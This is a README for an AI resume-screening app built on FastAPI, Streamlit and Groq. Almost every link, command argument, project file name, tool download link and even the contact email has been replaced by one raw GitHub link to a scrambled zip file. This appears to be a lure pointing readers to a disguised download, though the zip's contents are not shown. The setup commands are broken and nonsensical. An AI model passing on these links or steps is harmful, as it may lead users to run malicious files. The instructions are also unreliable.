# **AI-Powered HR Recruitment System**

This project is an **AI-driven recruitment tool** that automates the screening of candidates by analyzing resumes, matching them with job descriptions, evaluating resume strength, and generating interview questions. It uses **FastAPI** for the backend, **Streamlit** for the frontend, and **Groq API** for advanced AI analysis.

---

## **Features**
- **Resume Analysis**: Matches resumes with job descriptions and provides a match score.
- **Resume Evaluation**: Evaluates the strength of the resume and provides recommendations.
- **Interview Questions**: Generates tailored interview questions based on the resume.
- **User-Friendly Interface**: Built with Streamlit for easy interaction.
- **Scalable Backend**: Powered by FastAPI for high performance.

---

## **Tech Stack**
- **Backend**: FastAPI
- **Frontend**: Streamlit
- **AI Integration**: Groq API
- **PDF Parsing**: PyPDFLoader (LangChain) and PyPDF2
- **OCR**: pytesseract and pdf2image (for scanned PDFs)

---

## **Setup Instructions**

### **1. Clone the Repository**
```bash
git clone https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
cd hr-recruitment-system
```

### **2. Install Dependencies**
```bash
pip install -r https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
```

### **3. Set Up Environment Variables**
Create a `.env` file in the root directory and add your Groq API key:
```plaintext
GROQ_API_KEY=your-groq-api-key
```

### **4. Install Additional Dependencies**
- **Poppler (for PDF to Image Conversion)**:
  - **Linux**: `sudo apt-get install poppler-utils`
  - **macOS**: `brew install poppler`
  - **Windows**: Download from [poppler-windows](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip) and add to PATH.
- **Tesseract OCR**:
  - **Linux**: `sudo apt install tesseract-ocr`
  - **macOS**: `brew install tesseract`
  - **Windows**: Download from [UB-Mannheim](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip) and add to PATH.

---

## **Running the Application**

### **1. Start the FastAPI Backend**
```bash
uvicorn https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip --reload
```

### **2. Start the Streamlit Frontend**
```bash
streamlit run https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
```

### **3. Access the Application**
Open your browser and navigate to:
- **Streamlit UI**: `http://localhost:8501`
- **FastAPI Docs**: `http://localhost:8000/docs`

---

## **Deployment**

### **Frontend (Streamlit)**
The Streamlit frontend is deployed on **Streamlit Sharing**:
- **Live App**: [https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)

### **Backend (FastAPI)**
The FastAPI backend is deployed on **Koyeb**:
- **API Endpoint**: [https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip](https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)

---

## **Usage**
1. Enter the **Job Title** and **Job Description**.
2. Upload a **Resume** (PDF or TXT).
3. Optionally, add a **Cover Letter**.
4. Click **Analyze Resume** to see the results.
5. Click **Generate Interview Questions** to get tailored questions.

---

## **Project Structure**
```
hr-recruitment-system/
│
├── backend/                  # FastAPI backend
│   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip               # FastAPI entry point
│   ├── agents/               # AI agents
│   │   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│   │   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│   │   └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│   ├── services/             # Business logic
│   │   └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│   └── schemas/              # Pydantic models
│       └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│
├── frontend/                 # Streamlit frontend
│   ├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip                # Streamlit UI
│   └── utils/                # Frontend utilities
│       └── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
│
├── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip          # Dependencies
├── .env                      # Environment variables
├── .gitignore                # Ignore .env and other files
└── https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip                 # Project documentation
```

---

## **Example Output**
```json
{
  "status": "success",
  "data": {
    "match_result": {
      "match_score": 0.85,
      "is_match": true
    },
    "evaluation": {
      "strength_level": "high",
      "recommendation": "Shortlist and call the candidate."
    },
    "questions": {
      "questions": [
        "Describe your experience with Python.",
        "How do you handle tight deadlines?",
        "Explain a project where you used NLP."
      ]
    }
  }
}
```

---

## **Contributing**
Contributions are welcome! Follow these steps:
1. Fork the repository.
2. Create a new branch (`git checkout -b feature/your-feature`).
3. Commit your changes (`git commit -m 'Add some feature'`).
4. Push to the branch (`git push origin feature/your-feature`).
5. Open a pull request.

---

## **License**
This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

## **Acknowledgments**
- **FastAPI** for the backend framework.
- **Streamlit** for the frontend UI.
- **Groq API** for advanced AI analysis.
- **LangChain** for PDF parsing.

---

## **Contact**
For questions or feedback, feel free to reach out:
- **Email**: https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip
- **GitHub**:(https://raw.githubusercontent.com/adilmaqsood1/AI_Powered_HR_Recruitment_System/main/backend/Recruitment-A-System-H-Powered-2.6-beta.4.zip)

---

Enjoy using the **AI-Powered HR Recruitment System**! 🚀

Let me know if you need further updates! 😊
